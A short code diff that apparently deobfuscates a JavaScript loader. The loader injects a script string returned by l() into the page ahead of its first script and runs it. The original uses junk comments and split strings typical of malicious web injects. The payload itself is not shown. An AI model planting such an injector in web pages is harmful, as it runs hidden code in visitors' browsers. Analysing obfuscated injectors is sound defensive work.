@@ -1,6 +1,14 @@
+/* Embeds JS into the page between the 1st and the 2nd scripts, which are then executed */
+
+
 function fvbnvbn()/*s17192d31922hfj28896fs*/ {
-    var a = l(), fds = "rtBefore", c = document, b = c["createElement"]("script");/*s92098dfgh93715hffghj70477fs*/
-    b["type"] = "text/javascript", b["text"] = a, a = c["getElementsByTagName"]("script")[0], a.parentNode["inse" + fds](b, a)
+    var a = l(); /*s92098dfgh93715hffghj70477fs*/
+    c = document;
+    b = c["createElement"]("script");
+    b["type"] = "text/javascript";
+    b["text"] = a;
+    a = c["getElementsByTagName"]("script")[0];
+    a.parentNode["insertBefore"](b, a);
 }
 
 try {
@@ -28,3 +36,4 @@ function l() {
         }
     }
     return r;
+}
